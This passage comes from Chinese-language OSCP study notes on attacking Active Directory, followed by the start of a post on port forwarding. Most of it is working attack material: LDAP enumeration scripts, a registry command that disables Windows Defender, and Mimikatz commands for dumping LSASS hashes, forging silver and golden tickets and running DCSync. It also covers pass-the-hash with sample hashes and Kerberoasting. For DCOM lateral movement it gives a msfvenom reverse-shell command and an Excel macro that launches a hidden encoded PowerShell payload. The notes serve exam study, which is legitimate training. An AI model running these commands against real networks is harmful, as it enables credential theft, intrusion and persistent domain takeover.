class="hljs-variable">$SearchString</span> += <span class="hljs-variable">$DistinguishedName</span><br><span class="hljs-variable">$SearchString</span><br></code></pre></td></tr></table></figure></li><li>用于搜索用户的片段<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ps1"><span class="hljs-variable">$domainObj</span> = [<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain()<br><span class="hljs-variable">$PDC</span> = (<span class="hljs-variable">$domainObj</span>.PdcRoleOwner).Name<br><span class="hljs-variable">$SearchString</span> = <span class="hljs-string">&quot;LDAP://&quot;</span><br><span class="hljs-variable">$SearchString</span> += <span class="hljs-variable">$PDC</span> + <span class="hljs-string">&quot;/&quot;</span><br><span class="hljs-variable">$DistinguishedName</span> = <span class="hljs-string">&quot;DC=<span class="hljs-variable">$</span>(<span class="hljs-variable">$domainObj</span>.Name.Replace(&#x27;.&#x27;, &#x27;,DC=&#x27;))&quot;</span><br><span class="hljs-variable">$SearchString</span> += <span class="hljs-variable">$DistinguishedName</span><br><span class="hljs-variable">$Searcher</span> = <span class="hljs-built_in">New-Object</span> System.DirectoryServices.DirectorySearcher([<span class="hljs-type">ADSI</span>]<span class="hljs-variable">$SearchString</span>)<br><span class="hljs-variable">$objDomain</span> = <span class="hljs-built_in">New-Object</span> System.DirectoryServices.DirectoryEntry<br><span class="hljs-variable">$Searcher</span>.SearchRoot = <span class="hljs-variable">$objDomain</span><br><span class="hljs-comment">## $Searcher.filter=&quot;samAccountType=805306368&quot;  ## 用户</span><br><span class="hljs-comment">## $Searcher.filter=&quot;samAccountType=805306369&quot; ## 计算机</span><br><span class="hljs-comment">## $Searcher.filter=&quot;samAccountType=268435456&quot; ## 组</span><br><span class="hljs-variable">$Searcher</span>.FindAll()<br></code></pre></td></tr></table></figure></li><li>枚举所有用户的 PowerShell 脚本<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs ps1"><span class="hljs-variable">$domainObj</span> = [<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain()<br><span class="hljs-variable">$PDC</span> = (<span class="hljs-variable">$domainObj</span>.PdcRoleOwner).Name<br><span class="hljs-variable">$SearchString</span> = <span class="hljs-string">&quot;LDAP://&quot;</span><br><span class="hljs-variable">$SearchString</span> += <span class="hljs-variable">$PDC</span> + <span class="hljs-string">&quot;/&quot;</span><br><span class="hljs-variable">$DistinguishedName</span> = <span class="hljs-string">&quot;DC=<span class="hljs-variable">$</span>(<span class="hljs-variable">$domainObj</span>.Name.Replace(&#x27;.&#x27;, &#x27;,DC=&#x27;))&quot;</span><br><span class="hljs-variable">$SearchString</span> += <span class="hljs-variable">$DistinguishedName</span><br><span class="hljs-variable">$Searcher</span> = <span class="hljs-built_in">New-Object</span> System.DirectoryServices.DirectorySearcher([<span class="hljs-type">ADSI</span>]<span class="hljs-variable">$SearchString</span>)<br><span class="hljs-variable">$objDomain</span> = <span class="hljs-built_in">New-Object</span> System.DirectoryServices.DirectoryEntry<br><span class="hljs-variable">$Searcher</span>.SearchRoot = <span class="hljs-variable">$objDomain</span><br><span class="hljs-variable">$Searcher</span>.filter=<span class="hljs-string">&quot;samAccountType=805306368&quot;</span>  <span class="hljs-comment">## 用户</span><br><span class="hljs-variable">$Searcher</span>.FindAll()<br><span class="hljs-keyword">Foreach</span>(<span class="hljs-variable">$obj</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Result</span>)<br>&#123;<br>    <span class="hljs-keyword">Foreach</span>(<span class="hljs-variable">$prop</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$obj</span>.Properties)<br>    &#123;<br>        <span class="hljs-variable">$prop</span><br>    &#125;<br>&#125;<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;------------------------&quot;</span> &#125;<br></code></pre></td></tr></table></figure></li><li>修改 PowerShell 脚本以枚举所有域组<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ps1"><span class="hljs-variable">$domainObj</span> = [<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain()<br><span class="hljs-variable">$PDC</span> = (<span class="hljs-variable">$domainObj</span>.PdcRoleOwner).Name<br><span class="hljs-variable">$SearchString</span> = <span class="hljs-string">&quot;LDAP://&quot;</span><br><span class="hljs-variable">$SearchString</span> += <span class="hljs-variable">$PDC</span> + <span class="hljs-string">&quot;/&quot;</span><br><span class="hljs-variable">$DistinguishedName</span> = <span class="hljs-string">&quot;DC=<span class="hljs-variable">$</span>(<span class="hljs-variable">$domainObj</span>.Name.Replace(&#x27;.&#x27;, &#x27;,DC=&#x27;))&quot;</span><br><span class="hljs-variable">$SearchString</span> += <span class="hljs-variable">$DistinguishedName</span><br><span class="hljs-variable">$Searcher</span> = <span class="hljs-built_in">New-Object</span> System.DirectoryServices.DirectorySearcher([<span class="hljs-type">ADSI</span>]<span class="hljs-variable">$SearchString</span>)<br><span class="hljs-variable">$objDomain</span> = <span class="hljs-built_in">New-Object</span> System.DirectoryServices.DirectoryEntry<br><span class="hljs-variable">$Searcher</span>.SearchRoot = <span class="hljs-variable">$objDomain</span><br><span class="hljs-variable">$Searcher</span>.filter=<span class="hljs-string">&quot;(objectClass=Group)&quot;</span><br><span class="hljs-variable">$Result</span> = <span class="hljs-variable">$Searcher</span>.FindAll()<br><span class="hljs-keyword">Foreach</span>(<span class="hljs-variable">$obj</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Result</span>)<br>&#123;<br>    <span class="hljs-variable">$obj</span>.Properties.name<br>&#125;<br></code></pre></td></tr></table></figure></li><li>用于枚举组成员的 PowerShell 脚本<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ps1"><span class="hljs-variable">$domainObj</span> = [<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain()<br><span class="hljs-variable">$PDC</span> = (<span class="hljs-variable">$domainObj</span>.PdcRoleOwner).Name<br><span class="hljs-variable">$SearchString</span> = <span class="hljs-string">&quot;LDAP://&quot;</span><br><span class="hljs-variable">$SearchString</span> += <span class="hljs-variable">$PDC</span> + <span class="hljs-string">&quot;/&quot;</span><br><span class="hljs-variable">$DistinguishedName</span> = <span class="hljs-string">&quot;DC=<span class="hljs-variable">$</span>(<span class="hljs-variable">$domainObj</span>.Name.Replace(&#x27;.&#x27;, &#x27;,DC=&#x27;))&quot;</span><br><span class="hljs-variable">$SearchString</span> += <span class="hljs-variable">$DistinguishedName</span><br><span class="hljs-variable">$Searcher</span> = <span class="hljs-built_in">New-Object</span> System.DirectoryServices.DirectorySearcher([<span class="hljs-type">ADSI</span>]<span class="hljs-variable">$SearchString</span>)<br><span class="hljs-variable">$objDomain</span> = <span class="hljs-built_in">New-Object</span> System.DirectoryServices.DirectoryEntry<br><span class="hljs-variable">$Searcher</span>.SearchRoot = <span class="hljs-variable">$objDomain</span><br><span class="hljs-variable">$Searcher</span>.filter=<span class="hljs-string">&quot;(name=Domain Admins)&quot;</span><br><span class="hljs-keyword">Foreach</span>(<span class="hljs-variable">$obj</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Result</span>)<br>&#123;<br>    <span class="hljs-variable">$obj</span>.Properties.member<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="查询当前已登录的账号"><a href="#查询当前已登录的账号" class="headerlink" title="查询当前已登录的账号"></a>查询当前已登录的账号</h3><ul><li>当前登录账号的HASH缓存在内存中，找到属于高权限组的账号（Domain Admins）</li><li>从工作站本地管理员，提权到服务器管理员，再提权到域管理员（连锁提权）<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220820231345.png"></li><li>首先枚举域中所有计算机，然后使用NetWkstaUserEnum查询所有计算机当前登录账号<ul><li>需要拥有目标主机本地管理员权限</li></ul></li><li>使用NetSessionEnum查询服务器上的活动用户会话（普通权限即可）</li><li>禁用Defender<ul><li>REG ADD “\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender” &#x2F;v DisableAntiSpyware &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</li><li>gpupdate &#x2F;force</li></ul></li><li>导入PowerView<ul><li><a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1">https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1</a></li><li>使用PowerView简化流程并有助于避免端点安全检测</li><li><code>PS C:\Tools\active_directory&gt; Import-Module .\PowerView.ps1</code></li><li><code>Get-NetLoggedon</code> 函数执行NetWkstaUserEnum</li><li><code>Get-NetSession</code> 函数执行NetSessionEnum</li></ul></li><li>查询客户端计算机当前登录账号<ul><li><code>PS C:\Tools\active_directory&gt; Get-NetLoggedon -ComputerName client251</code></li></ul></li><li>查询DC的活动会话<ul><li><code>PS C:\Tools\active_directory&gt; Get-NetSession -ComputerName dc01</code></li></ul></li></ul><h3 id="通过SPN名枚举"><a href="#通过SPN名枚举" class="headerlink" title="通过SPN名枚举"></a>通过SPN名枚举</h3><ul><li>服务主体名称（SPN）是AD中的一种名称，客户端使用它唯一的标识服务实例</li><li>服务可能以高权限账号允许，LocalSystem、LocalService、NetworkService、域账号</li><li>当Exchange、SQL、IIS等应用集成AD部署时，SPNs作为服务实例的唯一标识符</li><li>通过枚举域中所有已注册的 SPN，我们可以获得在与目标 Active Directory 集成的服务器上运行的应用程序的 IP 地址和端口号，从而限制了对广泛端口扫描的需求</li><li>查询DC中存在的SPNs<ul><li><code>$Searcher.filter=&quot;serviceprincipalname=*http*&quot;</code></li></ul></li><li>系统自带命令查询SPN<ul><li><code>setspn -T lab -F -Q */*</code></li></ul></li></ul><h2 id="AD身份攻击"><a href="#AD身份攻击" class="headerlink" title="AD身份攻击"></a>AD身份攻击</h2><h3 id="AD身份认证"><a href="#AD身份认证" class="headerlink" title="AD身份认证"></a>AD身份认证</h3><ul><li>AD支持多种认证协议、技术，支持Windows、Linux、MacOS系统集中认证</li><li>大多数情况下，活动目录使用Kerberos、NTLM两种身份认证协议</li><li>WDigest认证协议支持Win7、2008 R2等早期版本的操作系统<ul><li>这个使用明文密码</li></ul></li></ul><h3 id="NTLM认证过程"><a href="#NTLM认证过程" class="headerlink" title="NTLM认证过程"></a>NTLM认证过程</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220821001732.png"></p><ol><li>客户端计算用户密码，生成NTLM HASH</li><li>客户端将用户名发给应用服务器</li><li>应用服务器返回Nonce随机值给客户端</li><li>客户端使用NTLM HASH加密Nonce，然后发回给应用服务器</li><li>APP服务器将用户名+Nonce+加密的Nonce全部发给DC</li><li>DC使用用户的 NTLM HASH对Nonce本身进行加密，并将其与从服务器收到的响应进行比较。如果两者相等，则认证请求成功</li></ol><ul><li>NTLM算法虽然不可逆，但简单密码可在几天内破解<ul><li>8个字符2.5h</li><li>9个字符11d</li></ul></li></ul><h3 id="Kerberos认证过程"><a href="#Kerberos认证过程" class="headerlink" title="Kerberos认证过程"></a>Kerberos认证过程</h3><ul><li>由MIT开发，Windows 2003开始作为AD默认的身份认证协议</li><li>Windows的Kerberos认证使用票据，DC作为密钥分发中心KDC和认证服务器AS<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220821003324.png"></li></ul><ol><li>登录用户域内计算机时，基于密码生成NTLM HASH。向DC发送AS_REQ，其中包含用户名+NTLM HASH加密的时间戳；DC使用用户的NTLM HASH解密时间戳，如果解密成功且时间戳不重复（防重放攻击），则认证成功</li><li>DC返回AS_REP，包含用户NTLM HASH加密的会话密钥+TGT（Ticket Granting Ticket）；TGT包含用户、组成员、域、时间戳、客户端IP、会话密钥等信息。TGT使用KDC独有的安全密钥加密，客户端无法解密，TGT的生存周期为10小时，周期自动刷新（缓存于客户端）</li><li>用户需要访问域内资源（SPN），再次联系KDC；向其请求服务票据TGS_REQ，其中包含会话密钥加密的当前用户名和时间戳+资源SPN+TGT</li><li>如果SPN存在（不验证用户是否有权访问SPN），KDC解密TGT获得会话密钥，用会话密钥解密出用户吗和时间戳，</li></ol><ul><li>接下来执行以下检查:<ol><li>TGT中的时间戳有效（无重放攻击且未过期）</li><li>TGS_REQ和TGT中的用户名一致</li><li>客户端IP与TGT中的客户端IP一致</li></ol></li><li>如果检查成功，TGS向客户端返回TGS_REP，包含以下内容<ol><li>授权访问的SPN</li><li>客户端和SPN之间使用的会话密钥</li><li>包含用户名和组成员关系以及创建新的会话密钥的服务票据ST</li></ol><ul><li>前两个部分（SPN+会话密钥）使用TGT中的会话密钥加密。ST使用SPN服务账号的NTLM HASH加密，并缓存与客户端</li></ul></li><li>至此KDC认证过程结束，客户端获得了会话密钥+ST，接下来开始服务认证过程</li></ul><ol start="5"><li>客户端向应用服务器发起AP_REQ，其中包含会话密钥加密的用户名和时间戳+ST（包含会话密钥）</li><li>应用服务器使用服务账号密码的HASH解密ST，获得用户名+会话密钥，使用会话密钥解密AP_REQ中的用户吗，如果用户吗从ST解密得到的用户名一致，请求被接受。授予访问权限之前，服务检查ST中提供的组成员关系，并为用户分配适当的权限，至此用户可以访问请求的服务了</li></ol><h3 id="缓存凭证存储和检索"><a href="#缓存凭证存储和检索" class="headerlink" title="缓存凭证存储和检索"></a>缓存凭证存储和检索</h3><ul><li><p>微软基于Kerberos实现了AD单点登录，密码哈希存储在LSASS内存空间中，用于首期更新TGT请求。如果得到密码HASH，则可以爆破密码或执行PtH攻击</p></li><li><p>LSASS以SYSTEM账号允许，需要管理员或SYSTEM全新啊才有权访问。因此成功的本地提权是发起后续攻击的前提。</p></li><li><p>内存中存储HASH的数据结构未公开，同时还被LSASS存储密钥所加密</p><ul><li>Mimikatz可用于提HASH</li></ul></li><li><p>为避免Mimikatz被杀软检测，可以使用powershell在内存中加载Mimikatz，或DUMP整个LSASS进程内存，将其拷贝到其他计算机中由Mimikatz读取</p><ul><li>ProcDump可DUMP进程内存</li></ul></li><li><p>禁用Defender</p><ul><li><code>REG ADD &quot;\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f</code></li><li><code>gpupdate /force</code></li></ul></li><li><p>读取LSASS进程内存的dump文件</p><ul><li>sekurlsa::minidump C:\Users\Documents\lsass.dmp</li></ul></li><li><p>TGT和ST也缓存于LSASS内存中，可使用Mimiktz获取票据攻击Kerberos认证过程<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901154600.png"></p></li><li><p>窃取ST将允许我们访问票据关联的特定资源</p></li><li><p>利用TGT可以请求其他资源的ST（读取和伪造票据实现AD攻击）</p></li><li><p>Mimikatz可以导出票据文件，然后倒入其他主机的LSASS</p></li></ul><h3 id="服务账号密码爆破"><a href="#服务账号密码爆破" class="headerlink" title="服务账号密码爆破"></a>服务账号密码爆破</h3><ul><li>用户访问SPN时，需要向DC请求ST，此时DC并不验证用户是否有权请求SPN服务</li><li>应用服务器会解密并验证票据（由SPN账号的密码HASH加密）</li><li>这意味着只要知道SPN名，即可向DC请求其ST，然后提取内存中的ST</li><li>由于ST使用服务账号HASH加密，因此当服务账号为高权限域用户（域管理员组）时，可以尝试爆破其密码</li><li>向指定SPN请求ST<ul><li><code> Add-Type -AssemblyName System.IdentityModel</code></li><li><code>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#39;H TTP/CorpWebServer.corp.com&#39;</code></li></ul></li><li>显示新增的缓存ST<ul><li><code>PS C:\Users\offsec.CORP&gt; klist</code></li></ul></li><li>导出上面缓存的ST<ul><li><code>mimikatz # kerberos::list /export</code></li></ul></li><li>破解SPN服务账号密码<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901162550.png"></li><li>低慢速密码破解<ul><li>爆破密码过程中可能会出现账号被锁</li><li>先查询账号锁定次数<ul><li><code>net accounts</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901165426.png"></li></ul></li></ul></li><li>密码喷射<ul><li>使用一个最常用密码字典针对域内所有用户执行密码破解攻击</li><li><a href="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901170400.png"></li></ul></li></ul><h2 id="AD横向移动"><a href="#AD横向移动" class="headerlink" title="AD横向移动"></a>AD横向移动</h2><h3 id="AD横向移动-1"><a href="#AD横向移动-1" class="headerlink" title="AD横向移动"></a>AD横向移动</h3><ul><li>密码破解耗时且成功率不高，可以利用密码HASH或票据直接横向移动</li><li>PtH登录域内其他主机<ul><li>不可用于Kerberos身份认证，只能用于NTLM身份认证</li><li>企业内网通常开放SMB服务，可以利用管理共享，PtH实现代码执行（需要本地管理员权限）</li><li><code>kali@kali:~$ pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2 eb3b9f05c425e //10.11.0.22 cmd</code></li><li>这种方法使用于AD域账号、administrator账号，但其他本地管理员账号不可用</li></ul></li><li>使用impacket包<ul><li><code>kali@kali:~$ impacket-vmiexec -hashes aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2 oscp/bob@10.0.2.68</code></li></ul></li></ul><h3 id="Overpass-the-Hash"><a href="#Overpass-the-Hash" class="headerlink" title="Overpass the Hash"></a>Overpass the Hash</h3><ul><li>基于已知的用户NTLM HASH获得TGT、ST，从而访问其他主机和服务</li><li>跨越哈希攻击的本质是将NTLM HASH转换成TGT，避免使用NTLM身份认证</li><li>以管理员的NTLM HASH运行Powerhsell进程<ul><li><code>mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d 87aa966c327 /run:PowerShell.exe</code></li></ul></li><li>通过使用 <code>net use</code> 对域控制器上的网络共享进行身份验证来生成 TGT<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901172004.png"></li><li>远程桌面受限管理<ul><li><code>mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d 87aa966c327 /run:PowerShell.exe</code></li><li><code>Enter-PSSession -Computer Target</code></li></ul></li><li>利用psexec在DC上执行系统命令<ul><li><code>PS C:\Tools\active_directory&gt; .\PsExec.exe \\dc01 cmd.exe</code></li></ul></li></ul><h3 id="Pass-the-Ticket"><a href="#Pass-the-Ticket" class="headerlink" title="Pass the Ticket"></a>Pass the Ticket</h3><ul><li><p>TGT只在生成的计算机上可用，ST更加灵活。PtT导出ST并重新注入到网络的其他地方，可用于对特定服务的身份验证。如果ST输入当前用户，则不需要管理员特权</p></li><li><p>这种攻击并没有提升权限，但可以选择在哪台目标主机上使用ST</p></li><li><p>如果服务账号密码或HASH泄漏，就可以伪造ST访问目标应用，这就是白银票据</p></li><li><p>Mimikatz可以伪造银票，并将其注入到内存中 &#x2F;ptt</p></li><li><p>创建票据受限需要知道域SID。查看当前用户SID，从中提取域SID<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901181145.png"></p></li><li><p>基于域SID生成银票，并将其注入到内存中</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mimikatz</span> # kerberos::purge<br><span class="hljs-attribute">mimikatz</span> # kerberos::list<br><span class="hljs-attribute">mimikatz</span> # kerberos::golden /user:offsec /domain:corp.com /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1602875587</span>-<span class="hljs-number">278</span> <span class="hljs-number">7523311</span>-<span class="hljs-number">2599479668</span> /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748 <span class="hljs-number">290</span>D87AA966C327 /ptt<br><span class="hljs-attribute">mimikatz</span> # kerberos::list<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901181704.png"></p></li><li><p>此时在目标服务看来，当前账号拥有本地以及域管理员权限，如果服务类型允许，有可能实现操作系统命令执行(MSSQL)</p></li></ul><h3 id="利用DCOM横向移动"><a href="#利用DCOM横向移动" class="headerlink" title="利用DCOM横向移动"></a>利用DCOM横向移动</h3><ul><li>COM是进程间交互组建的创建系统，DCOM则用于跨网络对主机之间的交互。DCOm需要本地管理员权限调用DCOM服务控制器，通过RPC（TCP 135）实现交互。</li><li>于Office相关的DCOM对象可用于横向移动，需要目标主机上安装有Office，该技术主要针对客户端</li><li>首先，我们必须首先使用 PowerShell 发现此 DCOM 对象的可用方法或子对象。使用 PowerShell 和 System.Activator 类的 CreateInstance 方法创建对象的实例。使用 GetTypeFromProgID 方法提供其类型<ul><li><code>$com = [activator]::CreateInstance([type]::GetTypeFromProgId(&quot;Excel.Application&quot;, &quot;192 .168.1.110&quot;))</code></li></ul></li><li>使用启动 notepad.exe 的 VBA 宏，文件保存为.xls格式<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vb"><span class="hljs-keyword">Sub</span> mymacro()<br>Shell (<span class="hljs-string">&quot;notepad.exe&quot;</span>)<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br></code></pre></td></tr></table></figure></li><li>通过SMB将文件拷贝到目标计算机上<ul><li><code>$LocalPath = &quot;C:\Users\jeff_admin.corp\myexcel.xls&quot;</code></li><li><code>$RemotePath = &quot;\\192.168.1.110\c$\myexcel.xls&quot;</code></li><li><code>[System.IO.File]::Copy($LocalPath, $RemotePath, $True)</code></li></ul></li><li>创建SYSTEM账号配置文件<ul><li><code>$Path = &quot;\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop&quot;</code></li><li><code>$temp = [system.io.directory]::createDirectory($Path)</code></li></ul></li><li>完整调用Open方法<ul><li><code>query_08.ps1</code></li></ul></li><li>改造以上代码，生产反弹shell文件<ul><li><code>kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f h ta-psh -o evil.hta</code></li></ul></li><li>使用以下脚本将payload切成小块<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ.....&quot;</span><br>n = <span class="hljs-number">50</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>), n):<br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Str = Str + &quot;</span> + <span class="hljs-string">&#x27;&quot;&#x27;</span> + <span class="hljs-built_in">str</span>[i:i+n] + <span class="hljs-string">&#x27;&quot;&#x27;</span><br></code></pre></td></tr></table></figure></li><li>修改宏代码，植入payload<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ps1">Sub MyMacro()<br>  Dim Str As String<br>  Str = Str + <span class="hljs-string">&quot;powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad&quot;</span><br>  Str = Str + <span class="hljs-string">&quot;ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA&quot;</span><br>  Str = Str + <span class="hljs-string">&quot;EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM&quot;</span><br>  Str = Str + <span class="hljs-string">&quot;AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA&quot;</span><br>  Shell (Str)<br><span class="hljs-keyword">End</span> Sub<br></code></pre></td></tr></table></figure></li></ul><h2 id="AD持久化"><a href="#AD持久化" class="headerlink" title="AD持久化"></a>AD持久化</h2><h3 id="AD持久化控制"><a href="#AD持久化控制" class="headerlink" title="AD持久化控制"></a>AD持久化控制</h3><ul><li>金票（声明用户为域管理员组成员）<ul><li>客户端请求TGT时，KDC使用krbtgt的HASH加密。如果获得此哈希，可自定义TGT，即金票</li><li>krbtgt的密码HASH只在域级别从2003升级到2008时改变</li><li>前提要求已经获得域管理员组权限，以此获取krbtgt账号的密码HASH</li><li><code>mimikatz # privilege::debug</code></li><li><code>mimikatz # lsadump::lsa /patch</code></li></ul></li><li>创建金票并植入内存，不需要管理员权限，甚至不需要加域（只要有HASH）</li><li>首先删除现有Kerberos票据，然后为fakeuser创建金票<ul><li><code>kerberos::purge</code></li><li><code>kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2 787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt</code></li></ul></li></ul><h3 id="AD持久化-1"><a href="#AD持久化-1" class="headerlink" title="AD持久化"></a>AD持久化</h3><ul><li>当使用金票时，mimikatz提供两组默认值，用户ID为500，组ID为域中高权限组组合</li><li>水平移动<ul><li><code>mimikatz # misc::cmd</code></li><li><code>C:\Users\offsec.crop&gt; psexec.exe \\dc01 cmd.exe</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901230101.png"></li></ul></li><li>如果fakeuser不存在，报错会记录。因此可使用真实存在的管理员账号和ID</li></ul><h3 id="DC同步"><a href="#DC同步" class="headerlink" title="DC同步"></a>DC同步</h3><ul><li>另一种AD持久化方法时窃取所有管理员的HASH</li><li>使用mimikatz在域控上查询全部HASH</li><li>拷贝NTDS.dit文件</li><li>从客户端远程获取所有用户的HASH</li><li>DC同步（replication）<ul><li>接收更新请求的域控制器不会验证该请求是否来自已知的域控制器，而只会验证关联的 SID 是否具有适当的权限</li></ul></li><li>使用域管理员账号登录工作站，mimikatz同步指定域账号<ul><li><code>mimikatz # lsadump::dcsync /user:Administrator</code></li></ul></li></ul><p><strong>1. 枚举用户名、组、嵌套</strong></p><p><strong>2. 枚举登录账号、会话</strong></p><p><strong>3. HASH</strong></p><p><strong>4. PtH</strong></p><p><strong>5. Overpass the Hash</strong></p><p><strong>6. 破解SPN服务账号</strong></p><p><strong>7. Pass the Ticket(银票)</strong></p><p><strong>8. 持久化</strong></p>]]></content>
    
    
    <categories>
      
      <category>OSCP-Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>内网渗透</tag>
      
      <tag>AD域</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>隧道与端口转发</title>
    <link href="/2022/08/18/%E9%9A%A7%E9%81%93%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    <url>/2022/08/18/%E9%9A%A7%E9%81%93%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<h3 id="隧道与端口转发"><a href="#隧道与端口转发" class="headerlink" title="隧道与端口转发"></a>隧道与端口转发</h3><ul><li>企业内网系统通常并不对外网开发</li><li>利用突破边界</li><li>内网穿透<ul><li>端口转发</li><li>隧道: 将其封装在不同的协议中。通过使用各种隧道技术，我们可以在不兼容的交付网络上承载给定的协议，或者通过不受信任的网络提供安全路径。</li><li>流量封装, 在严格受限的网络环境下打通内网</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818202704.png"></p><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><h3 id="端口转发-1"><a href="#端口转发-1" class="headerlink" title="端口转发"></a>端口转发</h3><ul><li>重定向到一个IP:PORT的流量到另一个IP:端口</li><li>RINETD<ul><li>所有WEB服务器80端口的请求重定向到另一个ip<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">kali@kali:~$ cat /etc/rinetd.conf<br>...<br># bindadress bindport connectaddress connectport<br><span 